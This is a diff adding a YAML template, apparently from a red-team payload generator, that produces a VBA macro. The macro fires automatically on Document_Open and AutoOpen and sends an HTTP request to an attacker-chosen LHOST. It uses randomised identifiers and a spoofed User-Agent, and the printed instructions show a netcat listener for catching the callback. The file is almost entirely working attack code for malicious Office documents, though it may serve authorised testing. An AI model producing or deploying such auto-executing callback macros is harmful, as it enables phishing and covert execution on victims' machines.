@@ -1,0 +1,43 @@
+description: "VBA Macro for a simple HTTP request"
+variables:
+  outputdir: "output/vba"
+  vbaFile: "http-request.vba"
+  port: 80
+templates:
+  vbaScript:
+    variables:
+      payload_fn: "{{ Helpers.random_str() }}"
+      objHTTP_fn: "{{ Helpers.random_str() }}"
+      URL_s: "{{ Helpers.random_str() }}"
+    template: |-
+      Sub {{payload_fn}}()
+        Dim {{objHTTP_fn}} As Object
+        Dim {{URL_s}} As String
+        Set {{objHTTP_fn}} = CreateObject("WinHttp.WinHttpRequest.5.1")
+        {{URL_s}} = "http://{{LHOST}}:{{port}}/{{Helpers.random_str()}}"
+        {{objHTTP_fn}}.Open "GET", {{URL_s}}, False
+        {{objHTTP_fn}}.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
+        {{objHTTP_fn}}.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
+        {{objHTTP_fn}}.send ("{{Helpers.random_str()}}")
+      End Sub
+      Sub Document_Open()
+        {{payload_fn}}
+      End Sub
+      Sub AutoOpen()
+        {{payload_fn}}
+      End Sub
+print:
+- "Generating a vba payload for a simple HTTP request to test execution"
+- "VBA File: {{outputdir}}/{{vbaFile}}"
+- |-
+  To Catch the request:
+  nc -lvnp 80
+  python3 -m http.server 80
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{vbaFile}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{vbaFile}}
+  {{Templates.get('vbaScript')}}
+  EOF
